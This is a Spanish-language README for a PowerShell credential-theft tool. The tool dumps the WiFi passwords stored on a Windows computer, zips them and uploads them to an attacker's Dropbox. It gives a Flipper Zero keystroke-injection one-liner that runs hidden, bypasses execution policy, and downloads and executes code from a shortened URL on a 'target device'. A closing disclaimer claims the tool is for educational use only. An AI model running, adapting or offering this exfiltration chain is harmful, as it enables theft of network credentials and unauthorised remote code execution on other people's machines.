---

# **Export-WiFiKeys**

Este script de PowerShell exporta las contraseñas de las redes WiFi almacenadas en tu computadora, las guarda en archivos de texto, las comprime en un archivo ZIP y luego sube el archivo ZIP a Dropbox. Después de completar el proceso, los archivos temporales se eliminan.


---

## **Requisitos**

- PowerShell 5.0 o superior
- Acceso a Internet
- Una cuenta de Dropbox y un token de acceso a la API de Dropbox

## **Instalación**

1. Clona este repositorio o descarga los archivos necesarios.
2. Define tu token de acceso a Dropbox en el script antes de ejecutarlo:

    ```powershell
    $db = "tu_token_de_dropbox"
    ```

## **Uso**

### En Windows:

1. Abre PowerShell con permisos de administrador.
2. Navega al directorio donde se encuentra el script.
3. Ejecuta el script:

    ```powershell
    .\Export-WiFiKeys.ps1
    ```

El script realizará las siguientes acciones:

- Creará un directorio con la fecha y hora actual en tu carpeta de Documentos.
- Almacenará las contraseñas WiFi en archivos de texto dentro de este directorio.
- Comprimirá el directorio en un archivo ZIP.
- Subirá el archivo ZIP a tu cuenta de Dropbox.
- Eliminará los archivos temporales creados durante el proceso.

### En Flipper Zero:

1. **Carga el archivo `.txt` a tu Flipper Zero:**

    - Guarda el script de PowerShell en tu Flipper Zero.
    - Carga el script a través de la interfaz del dispositivo.

2. **Ejecuta el script:**

    - Abre una terminal en tu Flipper Zero y ejecuta el siguiente comando:

    ```bash
    powershell -w h -ep bypass $db='';irm https://goo.su/x3RyN | iex
    ```

Esto ejecutará el script de PowerShell en el dispositivo de destino, exportando las contraseñas WiFi y subiéndolas a tu cuenta de Dropbox.

---

## **Detalles del Script**

### **Export-WiFiKeys**

Esta función realiza los siguientes pasos:

1. Crea un directorio con la fecha y hora actual en la carpeta de Documentos del usuario.
2. Recoge las contraseñas de las redes WiFi almacenadas en el sistema y las guarda en archivos de texto en el directorio creado.
3. Comprime el directorio en un archivo ZIP.
4. Llama a la función `DropBox-Upload` para subir el archivo ZIP a Dropbox.
5. Elimina los archivos temporales creados durante el proceso.

### **DropBox-Upload**

Esta función realiza los siguientes pasos:

1. Toma la ruta del archivo fuente como parámetro.
2. Define los encabezados y parámetros necesarios para la solicitud a la API de Dropbox.
3. Usa `Invoke-RestMethod` para subir el archivo a Dropbox.

---

## **Notas**

- Asegúrate de tener suficiente espacio en tu cuenta de Dropbox para el archivo ZIP que se subirá.
- El script debe ejecutarse con permisos de administrador para acceder a las contraseñas WiFi almacenadas en el sistema.
- **Recuerda:** Este script también puede ser ejecutado desde un Flipper Zero, lo que lo hace útil para pruebas en entornos controlados.

---

## **Licencia**

Este proyecto está licenciado bajo los términos de la licencia MIT. Consulta el archivo `LICENSE` para más detalles.

---

**🚨 Descargo de Responsabilidad:**

El uso de este repositorio y los scripts contenidos en él es responsabilidad exclusiva del usuario. El autor de este proyecto **no se hace responsable** de cualquier daño, perjuicio o actividad ilegal que resulte del uso de estos scripts en entornos no autorizados o no controlados. Este proyecto debe ser utilizado únicamente con fines educativos y en entornos de pruebas con permisos explícitos. El uso indebido de este código puede estar sujeto a acciones legales. El usuario es responsable de cumplir con todas las leyes locales y regulaciones aplicables.

---
